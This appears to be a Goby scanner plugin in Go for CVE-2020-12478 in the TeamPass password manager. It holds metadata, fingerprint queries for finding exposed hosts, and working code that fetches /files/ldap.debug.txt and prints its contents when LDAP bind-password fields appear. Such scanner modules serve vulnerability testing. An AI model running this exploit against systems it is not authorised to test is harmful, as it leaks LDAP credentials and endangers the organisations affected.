package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "TEAMPASS /files/ldap.debug.txt file information leakage vulnerability (CVE-2020-12478)",
    "Description": "<p>TEAMPASS is a collaborative password manager.</p><p>There is a security vulnerability in TEAMPASS version 2.1.27.36, which allows an attacker to retrieve files in the TEAMPASS web root directory (including backup files or LDAP debug files).</p>",
    "Product": "TEAMPASS",
    "Homepage": "https://teampass.net/",
    "DisclosureDate": "2023-03-22",
    "Author": "h1ei1",
    "FofaQuery": "(body=\"teampass\" && body=\"sources/main.queries.php\") || title==\"Teampass\"|| body=\"https://github.com/nilsteampassnet/TeamPass/issues\" || header=\"teampass_session\" || banner=\"teampass_session\"",
    "GobyQuery": "(body=\"teampass\" && body=\"sources/main.queries.php\") || title==\"Teampass\"|| body=\"https://github.com/nilsteampassnet/TeamPass/issues\" || header=\"teampass_session\" || banner=\"teampass_session\"",
    "Level": "2",
    "Impact": "<p>There is a security vulnerability in TEAMPASS version 2.1.27.36, which allows an attacker to retrieve files in the TEAMPASS web root directory (including backup files or LDAP debug files).</p>",
    "Recommendation": "<p>The manufacturer has released a security patch, please pay attention to the update in time: <a href=\"https://github.com/nilsteampassnet/teampass.\">https://github.com/nilsteampassnet/teampass.</a></p>",
    "References": [
        "https://github.com/nilsteampassnet/TeamPass/issues/2764"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        "CVE-2020-12478"
    ],
    "CNNVD": [
        "CNNVD-202004-2431"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "TEAMPASS /files/ldap.debug.txt 文件信息泄露漏洞（CVE-2020-12478）",
            "Product": "TEAMPASS",
            "Description": "<p>TEAMPASS 是一款协作密码管理器。</p><p>TEAMPASS 2.1.27.36 版本中存在安全漏洞，攻击者可利用该漏洞检索 TEAMPASS Web 根目录下的文件（包括备份文件或 LDAP 调试文件）。</p>",
            "Recommendation": "<p>厂商已发布安全补丁，请及时关注更新：<a href=\"https://github.com/nilsteampassnet/teampass\">https://github.com/nilsteampassnet/teampass</a>。<br></p>",
            "Impact": "<p>TEAMPASS 2.1.27.36 版本中存在安全漏洞，攻击者可利用该漏洞检索 TEAMPASS Web 根目录下的文件（包括备份文件或 LDAP 调试文件）。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "TEAMPASS /files/ldap.debug.txt file information leakage vulnerability (CVE-2020-12478)",
            "Product": "TEAMPASS",
            "Description": "<p>TEAMPASS is a collaborative password manager.</p><p>There is a security vulnerability in TEAMPASS version 2.1.27.36, which allows an attacker to retrieve files in the TEAMPASS web root directory (including backup files or LDAP debug files).</p>",
            "Recommendation": "<p>The manufacturer has released a security patch, please pay attention to the update in time: <a href=\"https://github.com/nilsteampassnet/teampass.\">https://github.com/nilsteampassnet/teampass.</a><br></p>",
            "Impact": "<p>There is a security vulnerability in TEAMPASS version 2.1.27.36, which allows an attacker to retrieve files in the TEAMPASS web root directory (including backup files or LDAP debug files).<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-10-25",
    "PocId": "10859"
}`
	sendPayload1asd159 := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		sendConfig := httpclient.NewGetRequestConfig("/files/ldap.debug.txt")
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, sendConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, _ := sendPayload1asd159(hostInfo)
			return resp != nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, `bind_passwd`) && strings.Contains(resp.RawBody, `user_attribute`) && strings.Contains(resp.RawBody, `domain_controllers`)
		},
		func(expResult *jsonvul.ExploitResult, singleScanConfig *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			resp, err := sendPayload1asd159(expResult.HostInfo)
			if err != nil {
				expResult.Output = err.Error()
			} else if resp.StatusCode == 200 && strings.Contains(resp.RawBody, `bind_passwd`) && strings.Contains(resp.RawBody, `user_attribute`) && strings.Contains(resp.RawBody, `domain_controllers`) {
				expResult.Success = true
				expResult.Output = resp.Utf8Html
			} else {
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}
